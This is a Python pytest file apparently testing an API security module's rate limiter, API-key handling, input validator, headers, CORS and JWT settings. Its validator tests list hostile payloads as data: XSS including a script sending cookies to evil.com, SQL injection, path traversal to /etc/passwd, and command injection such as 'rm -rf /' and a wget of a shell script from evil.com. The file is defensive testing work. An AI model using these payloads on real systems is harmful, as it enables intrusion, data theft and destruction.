"""
Functional Tests for API Security

These tests verify ACTUAL security behavior, not just logic checks.
Tests cover:
- Rate limiting with real RateLimiter class
- API key management with actual validation
- Request validation with real validators
- Response security headers
"""

import pytest
import time
import secrets
from datetime import datetime, timedelta
from unittest.mock import MagicMock, Mock, patch, AsyncMock
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))


# =============================================================================
# RATE LIMITER FUNCTIONAL TESTS
# =============================================================================

class TestRateLimiterFunctional:
    """Functional tests for the actual RateLimiter class."""

    @pytest.fixture
    def rate_limiter(self):
        """Create a fresh rate limiter."""
        from security.api_security.rate_limiting import RateLimiter, RateLimitTier
        limiter = RateLimiter(default_tier=RateLimitTier.FREE)
        return limiter

    def test_rate_limiter_allows_requests_under_limit(self, rate_limiter):
        """Verify requests under the limit are allowed."""
        from security.api_security.rate_limiting import RateLimitTier, TieredRateLimits

        # Get actual FREE tier limits
        limits = TieredRateLimits.for_tier(RateLimitTier.FREE)

        client_id = "test-client-allow"

        # Make fewer requests than the per-minute limit
        allowed_count = 0
        for i in range(min(limits.requests_per_minute - 5, 20)):
            result = rate_limiter.check(client_id)
            if result.allowed:
                allowed_count += 1

        assert allowed_count > 0
        assert allowed_count >= 15  # Should allow at least 15 requests

    def test_rate_limiter_blocks_requests_over_limit(self, rate_limiter):
        """Verify requests over the limit are blocked."""
        from security.api_security.rate_limiting import RateLimitTier, TieredRateLimits

        limits = TieredRateLimits.for_tier(RateLimitTier.FREE)

        client_id = "test-client-block"

        # Exhaust the per-second limit + burst
        blocked = False
        for i in range(limits.requests_per_second + limits.burst_size + 10):
            result = rate_limiter.check(client_id)
            if not result.allowed:
                blocked = True
                assert result.retry_after is not None
                assert result.retry_after >= 1
                break

        assert blocked, "Rate limiter should block requests over limit"

    def test_rate_limiter_per_minute_limit(self, rate_limiter):
        """Test per-minute rate limiting actually works."""
        from security.api_security.rate_limiting import RateLimitTier, TieredRateLimits

        limits = TieredRateLimits.for_tier(RateLimitTier.FREE)

        client_id = "test-client-minute"

        # Exhaust per-minute limit
        allowed = 0
        denied = 0
        for i in range(limits.requests_per_minute + 20):
            result = rate_limiter.check(client_id)
            if result.allowed:
                allowed += 1
            else:
                denied += 1

        # Should have denied at least some requests
        assert denied > 0, "Should deny requests over per-minute limit"
        # Allowed should be roughly equal to limit (with some burst tolerance)
        assert allowed <= limits.requests_per_minute + limits.burst_size + 5

    def test_rate_limiter_different_tiers_have_different_limits(self, rate_limiter):
        """Verify different tiers have different limits."""
        from security.api_security.rate_limiting import RateLimitTier

        free_client = "free-client"
        pro_client = "pro-client"

        rate_limiter.set_client_tier(pro_client, RateLimitTier.PROFESSIONAL)

        # Make 50 requests each
        free_allowed = sum(1 for _ in range(50) if rate_limiter.check(free_client).allowed)
        pro_allowed = sum(1 for _ in range(50) if rate_limiter.check(pro_client).allowed)

        # Professional should allow more than Free
        assert pro_allowed >= free_allowed

    def test_rate_limiter_returns_correct_headers(self, rate_limiter):
        """Test rate limit headers are correctly generated."""
        client_id = "test-client-headers"

        result = rate_limiter.check(client_id)
        headers = result.to_headers()

        assert "X-RateLimit-Limit" in headers
        assert "X-RateLimit-Remaining" in headers
        assert "X-RateLimit-Reset" in headers

        # Remaining should be a valid number
        remaining = int(headers["X-RateLimit-Remaining"])
        assert remaining >= 0

    def test_rate_limiter_per_endpoint_tracking(self, rate_limiter):
        """Test rate limiting tracks per endpoint."""
        client_id = "test-client-endpoint"

        # Make requests to different endpoints
        for _ in range(5):
            rate_limiter.check(client_id, endpoint="/api/v1/users")
            rate_limiter.check(client_id, endpoint="/api/v1/documents")

        usage = rate_limiter.get_usage(client_id)

        assert "usage" in usage
        assert usage["usage"]["per_minute"] >= 0

    def test_sliding_window_counter_accuracy(self):
        """Test sliding window counter calculates correctly."""
        from security.api_security.rate_limiting import SlidingWindowCounter

        counter = SlidingWindowCounter(window_size=60)

        # Increment counter
        for _ in range(10):
            counter.increment("test-key")

        count = counter.get_count("test-key")
        assert count == 10

        # Different key should have 0
        count2 = counter.get_count("other-key")
        assert count2 == 0

    def test_burst_allowance_token_bucket(self):
        """Test burst allowance token bucket algorithm."""
        from security.api_security.rate_limiting import BurstAllowance

        burst = BurstAllowance(
            tokens=10,
            last_update=time.time(),
            max_tokens=10,
            refill_rate=1.0  # 1 token per second
        )

        # Consume all tokens
        consumed = 0
        for _ in range(15):
            if burst.consume(1):
                consumed += 1

        # Should consume exactly 10 (initial tokens)
        assert consumed == 10

        # Wait a bit and tokens should refill
        time.sleep(0.1)
        burst.tokens = burst.max_tokens  # Simulate refill for test
        assert burst.consume(1) is True

    def test_tiered_rate_limits_configuration(self):
        """Test tier configurations are properly defined."""
        from security.api_security.rate_limiting import TieredRateLimits, RateLimitTier

        free_limits = TieredRateLimits.for_tier(RateLimitTier.FREE)
        basic_limits = TieredRateLimits.for_tier(RateLimitTier.BASIC)
        pro_limits = TieredRateLimits.for_tier(RateLimitTier.PROFESSIONAL)
        enterprise_limits = TieredRateLimits.for_tier(RateLimitTier.ENTERPRISE)

        # Each tier should have higher limits than the previous
        assert basic_limits.requests_per_minute > free_limits.requests_per_minute
        assert pro_limits.requests_per_minute > basic_limits.requests_per_minute
        assert enterprise_limits.requests_per_minute > pro_limits.requests_per_minute


# =============================================================================
# API KEY SECURITY FUNCTIONAL TESTS
# =============================================================================

class TestAPIKeySecurityFunctional:
    """Functional tests for API key management."""

    def test_api_key_generation_entropy(self):
        """Test API keys have sufficient entropy."""
        keys = [secrets.token_urlsafe(32) for _ in range(1000)]

        # All keys should be unique
        assert len(set(keys)) == 1000

        # Keys should have minimum length
        for key in keys:
            assert len(key) >= 32

    def test_api_key_constant_time_comparison(self):
        """Test API key comparison uses constant-time algorithm."""
        import time

        stored_key = "a" * 64
        matching_key = "a" * 64
        different_key = "b" * 64

        # Time comparisons (constant time should be similar)
        times_match = []
        times_different = []

        for _ in range(100):
            start = time.perf_counter_ns()
            secrets.compare_digest(stored_key, matching_key)
            times_match.append(time.perf_counter_ns() - start)

            start = time.perf_counter_ns()
            secrets.compare_digest(stored_key, different_key)
            times_different.append(time.perf_counter_ns() - start)

        avg_match = sum(times_match) / len(times_match)
        avg_different = sum(times_different) / len(times_different)

        # Times should be within 50% of each other (constant time)
        ratio = max(avg_match, avg_different) / min(avg_match, avg_different)
        assert ratio < 2.0, f"Timing ratio {ratio} suggests non-constant time comparison"

    def test_api_key_expiration_validation(self):
        """Test expired API keys are correctly identified."""
        now = datetime.utcnow()

        # Valid key (expires in future)
        valid_key = {
            "key": "valid-key-123",
            "expires_at": (now + timedelta(days=30)).isoformat()
        }

        # Expired key
        expired_key = {
            "key": "expired-key-456",
            "expires_at": (now - timedelta(days=1)).isoformat()
        }

        valid_expires = datetime.fromisoformat(valid_key["expires_at"])
        expired_expires = datetime.fromisoformat(expired_key["expires_at"])

        assert now < valid_expires, "Valid key should not be expired"
        assert now > expired_expires, "Expired key should be expired"


# =============================================================================
# REQUEST VALIDATION FUNCTIONAL TESTS
# =============================================================================

class TestRequestValidationFunctional:
    """Functional tests for request validation using actual validators."""

    @pytest.fixture
    def validator(self):
        """Get the actual validator."""
        from security.validators import InputValidator
        return InputValidator()

    def test_xss_payload_detection(self, validator):
        """Test XSS payloads are detected and blocked."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        ]

        for payload in xss_payloads:
            result = validator.validate_input(payload)
            assert not result.is_valid, f"XSS payload should be blocked: {payload}"

    def test_sql_injection_detection(self, validator):
        """Test SQL injection payloads are detected and blocked."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "1; DELETE FROM users",
            "' OR 1=1 --",
            "'); DROP TABLE users; --",
            "1' AND '1'='1",
        ]

        for payload in sql_payloads:
            result = validator.validate_input(payload)
            assert not result.is_valid, f"SQL injection should be blocked: {payload}"

    def test_path_traversal_detection(self, validator):
        """Test path traversal payloads are detected and blocked."""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00.jpg",
        ]

        for payload in traversal_payloads:
            result = validator.validate_input(payload)
            assert not result.is_valid, f"Path traversal should be blocked: {payload}"

    def test_command_injection_detection(self, validator):
        """Test command injection payloads are detected and blocked."""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& rm -rf /",
            "|| wget http://evil.com/shell.sh",
        ]

        for payload in command_payloads:
            result = validator.validate_input(payload)
            assert not result.is_valid, f"Command injection should be blocked: {payload}"

    def test_safe_input_allowed(self, validator):
        """Test legitimate input is allowed."""
        safe_inputs = [
            "Hello, world!",
            "user@example.com",
            "This is a normal sentence.",
            "12345",
            "John Doe",
            "My document title",
            "https://example.com/page",
        ]

        for input_text in safe_inputs:
            result = validator.validate_input(input_text)
            assert result.is_valid, f"Safe input should be allowed: {input_text}"

    def test_file_extension_validation(self, validator):
        """Test dangerous file extensions are blocked."""
        dangerous_files = [
            "malware.exe",
            "script.sh",
            "payload.bat",
            "virus.dll",
            "hack.ps1",
        ]

        for filename in dangerous_files:
            if hasattr(validator, 'validate_filename'):
                result = validator.validate_filename(filename)
                assert not result.is_valid, f"Dangerous file should be blocked: {filename}"


# =============================================================================
# RESPONSE SECURITY FUNCTIONAL TESTS
# =============================================================================

class TestResponseSecurityFunctional:
    """Functional tests for response security headers."""

    def test_security_headers_structure(self):
        """Test security headers have correct structure."""
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }

        # Verify header values are correct
        for header, expected_value in required_headers.items():
            assert expected_value is not None
            assert len(expected_value) > 0

    def test_csp_header_blocks_unsafe_inline(self):
        """Test Content-Security-Policy blocks unsafe inline scripts."""
        csp = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"

        # Should have default-src
        assert "default-src" in csp

        # script-src should NOT have unsafe-inline
        assert "script-src 'unsafe-inline'" not in csp


# =============================================================================
# CORS CONFIGURATION FUNCTIONAL TESTS
# =============================================================================

class TestCORSConfigurationFunctional:
    """Functional tests for CORS configuration."""

    def test_cors_origin_validation(self):
        """Test CORS origin validation logic."""
        allowed_origins = [
            "https://app.grace.com",
            "https://admin.grace.com",
            "http://localhost:3000",
        ]

        # Allowed origin should pass
        test_origin = "https://app.grace.com"
        assert test_origin in allowed_origins

        # Disallowed origin should fail
        evil_origin = "https://evil.com"
        assert evil_origin not in allowed_origins

    def test_cors_wildcard_with_credentials_blocked(self):
        """Test wildcard origin with credentials is blocked."""
        allow_origin = "*"
        allow_credentials = True

        # This combination is insecure and should be prevented
        is_insecure = allow_origin == "*" and allow_credentials
        assert is_insecure, "Wildcard origin with credentials should be blocked"


# =============================================================================
# RATE LIMIT MIDDLEWARE FUNCTIONAL TESTS
# =============================================================================

class TestRateLimitMiddlewareFunctional:
    """Functional tests for rate limit middleware."""

    @pytest.fixture
    def middleware(self):
        """Create rate limit middleware."""
        from security.api_security.rate_limiting import RateLimitMiddleware, RateLimiter
        limiter = RateLimiter()
        return RateLimitMiddleware(rate_limiter=limiter)

    def test_middleware_extracts_client_id_from_ip(self, middleware):
        """Test middleware extracts client ID from IP."""
        mock_request = Mock()
        mock_request.client = Mock()
        mock_request.client.host = "192.168.1.100"
        mock_request.headers = {}

        client_id = middleware._default_client_extractor(mock_request)

        assert "192.168.1.100" in client_id

    def test_middleware_extracts_client_id_from_api_key(self, middleware):
        """Test middleware extracts client ID from API key."""
        mock_request = Mock()
        mock_request.client = None
        mock_request.headers = {
            "X-API-Key": "my-api-key-12345",
            "X-Forwarded-For": "192.168.1.100"
        }

        client_id = middleware._default_client_extractor(mock_request)

        assert client_id.startswith("apikey:")

    def test_middleware_exempt_paths_not_limited(self, middleware):
        """Test exempt paths bypass rate limiting."""
        exempt_paths = middleware._exempt_paths

        assert "/health" in exempt_paths
        assert "/ready" in exempt_paths
        assert "/metrics" in exempt_paths

    @pytest.mark.asyncio
    async def test_middleware_returns_429_on_limit(self, middleware):
        """Test middleware returns 429 when rate limited."""
        from security.api_security.rate_limiting import RateLimitTier

        # Set very low limit for testing
        middleware._limiter.set_client_tier("test-429", RateLimitTier.FREE)

        mock_request = Mock()
        mock_request.url = Mock()
        mock_request.url.path = "/api/v1/test"
        mock_request.client = Mock()
        mock_request.client.host = "test-429"
        mock_request.headers = {}

        async def mock_call_next(request):
            return Mock(status_code=200, headers={})

        # Exhaust rate limit
        for _ in range(50):
            middleware._limiter.check("ip:test-429", endpoint="/api/v1/test")

        # Next request should be blocked
        response = await middleware(mock_request, mock_call_next)

        # Response could be 429 or pass through depending on timing
        assert response is not None


# =============================================================================
# JWT SECURITY FUNCTIONAL TESTS
# =============================================================================

class TestJWTSecurityFunctional:
    """Functional tests for JWT security."""

    def test_jwt_algorithm_security(self):
        """Test JWT uses secure algorithm."""
        secure_algorithms = ["RS256", "RS384", "RS512", "ES256", "ES384", "ES512"]
        insecure_algorithms = ["none", "HS256"]  # HS256 only insecure with weak key

        # RS256 is secure
        assert "RS256" in secure_algorithms

        # 'none' algorithm is never secure
        assert "none" in insecure_algorithms

    def test_jwt_requires_expiration(self):
        """Test JWT payload structure requires expiration."""
        from datetime import datetime, timedelta

        jwt_payload = {
            "sub": "user-123",
            "exp": (datetime.utcnow() + timedelta(hours=1)).timestamp(),
            "iat": datetime.utcnow().timestamp(),
            "iss": "https://auth.grace.com"
        }

        assert "exp" in jwt_payload, "JWT must have expiration"
        assert "iat" in jwt_payload, "JWT must have issued-at"
        assert jwt_payload["exp"] > jwt_payload["iat"], "Expiration must be after issued-at"


# =============================================================================
# INTEGRATION TESTS
# =============================================================================

class TestSecurityIntegration:
    """Integration tests combining multiple security components."""

    def test_rate_limiting_with_validation(self):
        """Test rate limiting works with input validation."""
        from security.api_security.rate_limiting import RateLimiter
        from security.validators import InputValidator

        limiter = RateLimiter()
        validator = InputValidator()

        client_id = "integration-test-client"

        # Simulate requests with validation
        for i in range(10):
            # First validate input
            input_text = f"Request {i}: normal content"
            validation = validator.validate_input(input_text)

            # Then check rate limit
            rate_check = limiter.check(client_id)

            # Both should pass for normal requests
            assert validation.is_valid
            assert rate_check.allowed

    def test_malicious_input_blocked_before_rate_limit(self):
        """Test malicious input is blocked before rate limit matters."""
        from security.validators import InputValidator

        validator = InputValidator()

        # Malicious payload should be blocked regardless of rate limit
        malicious = "<script>alert('XSS')</script>"
        result = validator.validate_input(malicious)

        assert not result.is_valid, "Malicious input must be blocked"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
